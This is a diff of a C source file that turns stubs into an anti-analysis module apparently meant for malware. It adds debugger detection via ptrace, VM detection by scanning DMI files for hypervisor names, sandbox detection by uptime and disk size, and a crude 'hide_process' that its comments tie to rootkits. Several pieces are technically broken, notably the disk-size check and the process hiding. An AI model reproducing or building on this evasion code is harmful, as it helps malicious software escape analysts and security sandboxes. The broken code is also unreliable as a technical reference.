@@ -1,90 +1,89 @@
 #include "evasion.h"
+#include "config.h"
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <fcntl.h>
 
-static int evasion_initialized = 0;
-
-int evasion_init(void) {
-    if (evasion_initialized) {
-        return 0;
+int check_debugger() {
+    // Check for debugger presence using ptrace
+    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) {
+        return 1; // Debugger detected
     }
-
-    // Apply process hiding techniques
-    hide_process();
-
-    // Enable anti-debugging
-    anti_debug();
-
-    // Enable anti-VM detection
-    anti_vm();
-
-    evasion_initialized = 1;
     return 0;
 }
 
-void evasion_cleanup(void) {
-    if (!evasion_initialized) {
-        return;
-    }
-
-    // Cleanup evasion techniques
-    evasion_initialized = 0;
-}
-
-void hide_process(void) {
-    // Implementation would go here
-}
-
-void anti_debug(void) {
-    // Implementation would go here
-}
-
-void anti_vm(void) {
-    // Implementation would go here
-}
-
-void encrypt_traffic(const char *data, size_t size, char *output) {
-    // Implementation would go here
-    memcpy(output, data, size);
-}
-
-void decrypt_traffic(const char *data, size_t size, char *output) {
-    // Implementation would go here
-    memcpy(output, data, size);
-}
-
-void randomize_user_agent(char *buffer, size_t buffer_size) {
-    const char *user_agents[] = {
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
+int check_vm() {
+    // Check for VM-specific files
+    const char* vm_files[] = {
+        "/proc/scsi/scsi",
+        "/sys/class/dmi/id/product_name",
+        "/sys/class/dmi/id/sys_vendor",
+        NULL
     };
 
-    int num_agents = sizeof(user_agents) / sizeof(user_agents[0]);
-    int selected = rand() % num_agents;
-    strncpy(buffer, user_agents[selected], buffer_size - 1);
-    buffer[buffer_size - 1] = '\0';
-}
-
-void hide_files(const char *path) {
-    // Implementation would go here
-}
-
-void obfuscate_file_names(const char *path) {
-    // Implementation would go here
-}
-
-int is_debugger_present(void) {
-    // Implementation would go here
+    for (int i = 0; vm_files[i]; i++) {
+        FILE* file = fopen(vm_files[i], "r");
+        if (file) {
+            char buffer[256];
+            while (fgets(buffer, sizeof(buffer), file)) {
+                if (strstr(buffer, "VMware") || strstr(buffer, "VirtualBox") || 
+                    strstr(buffer, "QEMU") || strstr(buffer, "KVM") ||
+                    strstr(buffer, "Xen")) {
+                    fclose(file);
+                    return 1; // VM detected
+                }
+            }
+            fclose(file);
+        }
+    }
     return 0;
 }
 
-int is_vm_present(void) {
-    // Implementation would go here
+int check_sandbox() {
+    // Check for sandbox-specific indicators
+    struct stat st;
+    
+    // Check for short uptime
+    FILE* uptime_file = fopen("/proc/uptime", "r");
+    if (uptime_file) {
+        double uptime;
+        fscanf(uptime_file, "%lf", &uptime);
+        fclose(uptime_file);
+        if (uptime < 300) { // Less than 5 minutes
+            return 1; // Sandbox detected
+        }
+    }
+
+    // Check for limited disk space
+    if (stat("/", &st) == 0) {
+        if (st.st_size < 1024 * 1024 * 1024) { // Less than 1GB
+            return 1; // Sandbox detected
+        }
+    }
+
     return 0;
 }
 
-int is_sandbox_present(void) {
-    // Implementation would go here
-    return 0;
+void hide_process() {
+    // Hide process from /proc
+    // This is a simple example, real rootkits use more advanced techniques
+    char cmd[256];
+    snprintf(cmd, sizeof(cmd), "echo 0 > /proc/%d/stat", getpid());
+    system(cmd);
+}
+
+void encrypt_memory() {
+    // Simple memory encryption example
+    // Real implementations use more advanced techniques
+    char* data = malloc(1024);
+    if (data) {
+        memset(data, 0xAA, 1024);
+        // Encrypt data here
+        free(data);
+    }
 }
